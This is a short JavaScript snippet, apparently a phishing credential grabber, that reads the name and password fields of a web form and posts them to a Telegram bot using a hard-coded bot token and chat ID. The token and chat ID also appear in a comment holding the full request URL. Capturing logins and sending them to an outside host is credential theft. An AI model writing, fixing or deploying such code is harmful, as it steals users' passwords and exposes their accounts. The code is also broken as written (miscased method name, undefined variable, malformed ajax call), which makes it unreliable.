// https://api.telegram.org/bot5439820694:AAF3Py7kDcC-3TArQbUf7JhDYRPh2-TYVUM/sendMessage?chat_id=5678313969&text=halojuga&parse_mode=html

/// name%3A(%20ssss%20)%0A%0Apassword%3A(%20ssss%20)

function KirimPesan() {
    var name = document.getElementByid(`name`);
    var name = document.getElementByid(`password`);

    var gabungan = `name%3A(%20` + name.value + `%20)%0A%0Apassword%3A(%20` +password.value;
    
    var token = `5439820694:AAF3Py7kDcC-3TArQbUf7JhDYRPh2-TYVUM`;
    var grup = `5678313969`;

    $.ajax([
        url `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method `post`,
    ])
}